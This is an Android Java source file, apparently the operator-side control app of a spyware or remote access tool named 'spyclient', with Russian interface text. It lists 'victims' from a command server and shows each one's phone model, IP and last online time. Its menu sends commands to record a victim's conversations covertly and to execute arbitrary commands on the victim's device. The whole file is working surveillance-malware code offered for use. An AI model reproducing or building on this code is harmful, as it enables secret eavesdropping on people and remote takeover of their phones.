package slade.carter.spyclient;

import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.view.ContextMenu;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.simple.JSONObject;
import org.json.simple.JSONArray;
import org.w3c.dom.Text;

import java.util.Date;

public class VictimsActivity extends AppCompatActivity {
    private static VictimsActivity _instance;
    private ListView _victimListView;
    private Button _updateButton;
    //public boolean isClicked;

    public static VictimsActivity getInstance() {
        return _instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_victims);
        _instance = this;

        NettyClient.getInstance().sendGetVictims();

        _victimListView = (ListView) findViewById(R.id.victimListView);
        _updateButton = (Button) findViewById(R.id.updateButton);

        initListeners();
        registerForContextMenu(_victimListView);
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    private void initListeners() {
        _updateButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                MainActivity.getInstance().showText("Получаем список жертв...");

                NettyClient.getInstance().sendGetVictims();
            }
        });
        _victimListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                String victim = ((TextView) view).getText().toString();
                Intent intent = new Intent(_instance, MenuActivity.class);
                intent.putExtra("victim", victim);
                startActivity(intent);
            }
        });
    }

    public void send_getVictims() {
        NettyClient.getInstance().sendGetVictims();
    }

    public void initVictimList(JSONArray victims) {
        _victimListView.setVisibility(View.INVISIBLE);
        // создаем адаптер
        if (victims.size() == 0) {
            Toast.makeText(this, "Жертвы оффлайн!", Toast.LENGTH_LONG).show();
            return;
        }
        MainActivity.getInstance().showText("Жертвы доступны!");
        _victimListView.setVisibility(View.VISIBLE);
        String[] victimList = new String[victims.size()];
        for (int i = 0; i < victimList.length; i++) {
            String name = (String) ((JSONObject)victims.get(i)).get("name");
            Boolean online = (Boolean) ((JSONObject)victims.get(i)).get("online");
           /* if (online) name += " (online)";
            else name += " (offline)";*/
            victimList[i] = name;
        }
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, victimList);
        // присваиваем адаптер списку
        _victimListView.setAdapter(adapter);
    }

    public void initVictimInfo(String victim, JSONObject info) {
        String phoneName = (String) info.get("phoneName");
        String model = (String) info.get("model");
        String ip = (String) info.get("ip");
        int serverPort = ((Long) info.get("serverPort")).intValue();
        long lastOnline = (long) info.get("lastOnline");

        LayoutInflater layoutInflater = LayoutInflater.from(this);
        final View infoView = layoutInflater.inflate(R.layout.view_victiminfo, null);

        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setView(infoView);

        TextView victimTextView = (TextView) infoView.findViewById(R.id.victimTextView);
        TextView phoneNameTextView = (TextView) infoView.findViewById(R.id.phoneNameTextView);
        TextView modelTextView = (TextView) infoView.findViewById(R.id.modelTextView);
        TextView ipTextView = (TextView) infoView.findViewById(R.id.ipTextView);
        TextView serverPortTextView = (TextView) infoView.findViewById(R.id.serverPortTextView);
        TextView lastOnlineTextView = (TextView) infoView.findViewById(R.id.lastOnlineTextView);

        String lastOnlineText = new Date(lastOnline).toString();
        int diff = (int) ((System.currentTimeMillis() - lastOnline) / 1000);
        if (diff < 60*60)
            lastOnlineText = diff + " сек. назад";

        victimTextView.setText("Жертва: " + victim);
        phoneNameTextView.setText("Телефон: " + phoneName);
        modelTextView.setText("Модель: " + model);
        ipTextView.setText("SERVER_IP: " + ip);
        serverPortTextView.setText("SERVER_PORT: " + serverPort);
        lastOnlineTextView.setText("Online: " + lastOnlineText);

        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        alertDialogBuilder.create();
        alertDialogBuilder.show();
    }

    @Override
    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {
        menu.add("Информация");
        menu.add("Последний онлайн");
        menu.add("Запись разговора");
        menu.add("Изменить имя");
        menu.add("Изменить IP_ADDRESS");
        menu.add("Изменить SERVER_PORT");
        menu.add("Выполнить CMD");
    }

    @Override
    public boolean onContextItemSelected(MenuItem item) {
        String itemName = item.toString();
        AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
        final String victim = ((TextView)info.targetView).getText() + "";
        switch (itemName) {
            case "Информация":
                NettyClient.getInstance().sendGetVictimInfo(victim);
                break;
            case "Последний онлайн":
                /*outputJSONObject = new JSONObject();
                    outputJSONObject.put("action", "getLastOnline");
                    outputJSONObject.put("victim", victim);
                    outputJSONObject.put("token", Config.token);*/
                //MainActivity.getInstance().sendMessage(outputJSONObject);
                break;
            case "Запись разговора":
                LayoutInflater layoutInflater = LayoutInflater.from(this);
                final View inputView0 = layoutInflater.inflate(R.layout.view_input, null);
                TextView inputTextView = (TextView) inputView0.findViewById(R.id.inputTextView);
                inputTextView.setText("Ввод (секунды):");

                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView0);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView0.findViewById(R.id.inputEditText);
                        int seconds = Integer.parseInt(inputEditText.getText().toString());
                        if (seconds < 1) return;
                        NettyClient.getInstance().sendStartAudioRecord(victim, (long) seconds);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            case "Изменить имя":
                layoutInflater = LayoutInflater.from(this);
                final View inputView = layoutInflater.inflate(R.layout.view_input, null);

                alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView.findViewById(R.id.inputEditText);
                        String newName = inputEditText.getText().toString();
                        if (newName.trim().isEmpty()) return;
                        NettyClient.getInstance().sendSetVictimName(victim, newName);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            /*case "Изменить владельца":
                layoutInflater = LayoutInflater.from(this);
                final View inputView2 = layoutInflater.inflate(R.layout.view_input, null);

                alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView2);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView2.findViewById(R.id.inputEditText);
                        String newOwner = inputEditText.getText().toString();
                        if (newOwner.trim().isEmpty()) return;
                        JSONObject outputJSONObject = new JSONObject();

                            outputJSONObject.put("action", "setOwner");
                            outputJSONObject.put("victim", victim);
                            outputJSONObject.put("owner", newOwner);
                            outputJSONObject.put("token", Config.token);

                        //MainActivity.getInstance().sendMessage(outputJSONObject);
                        isClicked = false;
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;*/
            case "Изменить IP_ADDRESS":
                layoutInflater = LayoutInflater.from(this);
                final View inputView3 = layoutInflater.inflate(R.layout.view_input, null);

                alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView3);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView3.findViewById(R.id.inputEditText);
                        String newIP = inputEditText.getText().toString();
                        if (newIP.trim().isEmpty()) return;
                        JSONObject outputJSONObject = new JSONObject();

                            outputJSONObject.put("action", "setIP");
                            outputJSONObject.put("victim", victim);
                            outputJSONObject.put("ip", newIP);
                            outputJSONObject.put("token", Config.token);

                        //MainActivity.getInstance().sendMessage(outputJSONObject);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            case "Изменить SERVER_PORT":
                layoutInflater = LayoutInflater.from(this);
                final View inputView4 = layoutInflater.inflate(R.layout.view_input, null);

                alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView4);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView4.findViewById(R.id.inputEditText);
                        String newServerPort = inputEditText.getText().toString();
                        if (newServerPort.trim().isEmpty()) return;
                        JSONObject outputJSONObject = new JSONObject();

                            outputJSONObject.put("action", "setServerPort");
                            outputJSONObject.put("victim", victim);
                            outputJSONObject.put("serverPort", newServerPort);
                            outputJSONObject.put("token", Config.token);

                        //MainActivity.getInstance().sendMessage(outputJSONObject);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            case "Выполнить CMD":
                layoutInflater = LayoutInflater.from(this);
                final View inputView5 = layoutInflater.inflate(R.layout.view_input, null);

                alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(inputView5);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText inputEditText = (EditText) inputView5.findViewById(R.id.inputEditText);
                        String command = inputEditText.getText().toString();
                        if (command.trim().isEmpty()) return;

                        NettyClient.getInstance().sendCmd(victim, command);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
        }
        return super.onContextItemSelected(item);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("Настройки");
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        String itemName = item.toString();
        switch (itemName) {
            case "Настройки":
                Intent intent = new Intent(_instance, SettingsActivity.class);
                startActivity(intent);
                break;

        }
        return true;
    }
}
